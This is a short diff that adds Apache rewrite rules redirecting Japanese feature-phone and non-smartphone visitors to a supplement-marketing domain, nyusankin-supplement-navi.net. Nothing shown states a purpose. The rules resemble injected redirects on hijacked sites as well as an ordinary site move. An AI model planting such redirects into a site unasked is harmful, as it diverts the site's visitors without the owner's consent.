@@ -1,0 +1,6 @@
+RewriteEngine Off
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} (DoCoMo|KDDI|DDIPOKET|UP\.Browser|J-PHONE|Vodafone|SoftBank)
+RewriteRule ^(.*)$ http://nyusankin-supplement-navi.net/m/$1 [R,L]
+RewriteCond %{HTTP_USER_AGENT} !(iPhone|iPod|Android.*Mobile|Windows.*Phone|BlackBerry)
+RewriteRule ^(.*)$ http://nyusankin-supplement-navi.net/$1 [R,L]
